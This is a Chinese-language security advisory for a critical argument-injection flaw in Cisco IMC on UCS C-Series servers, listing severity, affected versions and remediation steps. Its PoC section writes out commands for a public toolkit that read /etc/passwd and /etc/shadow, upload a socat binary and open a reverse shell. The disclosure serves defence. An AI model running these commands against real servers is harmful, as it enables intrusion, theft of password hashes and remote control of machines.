**严重程度：** Critical
**CVSS：** 8.8-9.9
**影响版本：** Cisco UCS C-Series M7/M8 (所有 IMC 版本)
**公开日期：** 2026-08-05

### 漏洞描述
Cisco Integrated Management Controller (IMC) 存在参数注入漏洞，低权限认证攻击者可通过特制 CLI 命令注入任意参数，实现 Root 级远程代码执行。IMC 是 Cisco UCS 服务器的远程管理接口（类似 iLO/iDRAC），暴露在 443 端口。攻击者可下载任意文件、上传恶意文件、获取反向 Shell。

### POC/利用
```python
# CIMCown PoC Toolkit - NSIDE ATTACK LOGIC
# GitHub: https://github.com/NSIDE-ATTACK-LOGIC/CIMCown
# 需要低权限 IMC 账户凭据

# 安装
# pip install -r requirements.txt
# sudo apt install golang-go

# 测试连接（下载 /etc/passwd）
python CIMCown.py -U testAdmin -P testPassword -a test -t 192.168.10.2

# 下载任意文件
python CIMCown.py -U testAdmin -P testPassword -a download -d "/etc/shadow" -t 192.168.10.2

# 上传恶意文件
python CIMCown.py -U testAdmin -P testPassword -a upload -u "./shell/socat" -p "/tmp/socat" -t 192.168.10.2

# 构建并获取反向 Shell
python CIMCown.py -U testAdmin -P testPassword -a build
python CIMCown.py -U testAdmin -P testPassword -a shell
```

### 修复建议
1. 升级 IMC 固件至 Cisco 修复版本
2. 限制 IMC 管理接口仅限内网访问
3. 使用强密码并限制 IMC 账户权限
4. 监控 IMC 异常文件操作和网络连接
